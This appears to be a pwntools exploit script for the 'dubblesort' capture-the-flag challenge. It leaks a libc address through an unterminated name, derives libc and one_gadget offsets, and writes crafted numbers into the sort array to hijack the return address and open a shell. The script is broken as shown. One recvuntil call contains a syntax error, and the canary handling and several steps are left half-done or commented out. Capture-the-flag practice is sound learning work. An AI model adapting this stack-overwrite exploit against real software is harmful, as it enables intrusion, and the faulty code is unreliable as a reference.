#! /usr/bin/env python
from pwn import *
import sys

context.terminal = ['tmux', 'splitw', '-h']
context(log_level="error")
#p = remote("chall.pwnable.tw", 10101)
elf = ELF("./libc_32.so.6")
bin = ELF("./dubblesort")
p = process("./dubblesort")
gdb.attach(p,'b *main+319')

# name goes here -> 0xffffca7c for 64 spots
# count goes here -> 0xffffca58 this is a %u value
# 
# Name variable has old libc address.
# Sending small value ("\n") will leak libc address

###### STACK #######
# 0x1e879 = pop esi, ret
# 0x1487fb = one_gadget
# 0x149a28 = pop_ebp
# 


p.recvuntil(b"What your name :")
p1 = b"\x80"
#p2 = "5"
p.send(p1)

msg1 = p.recvuntil(b"sort :").replace(b',', b' ').split(b' ')
addr = u32(msg1[1])
libc = addr-0x1cac90
libc_base = libc - 0x1edf0
one_gadget = libc_base + 0x1487fb
got_libc = libc + 0x1cc210
print(hex(libc_base))
print(hex(libc))
print(hex(one_gadget))
p.sendline(b"43")

for i in range(17):
    p.recvuntil(b"number : ":)
    p.sendline(b"4")

for i in range(6):
    p.recvuntil(b"number : ")
    p.sendline(str(libc))


p.recvuntil(b"number : ")
p.sendline(str(one_gadget))





#p.recvuntil(b"number : ")
#p.sendline(str(libc))
p.recvuntil(b"number : ")
p.sendline(b"\x00")

'''
p.recvuntil(b"number : ")
p.sendline(b"2222")
'''
#p.recvuntil(b"number : ")
#p.send(b"1111")
p.interactive()
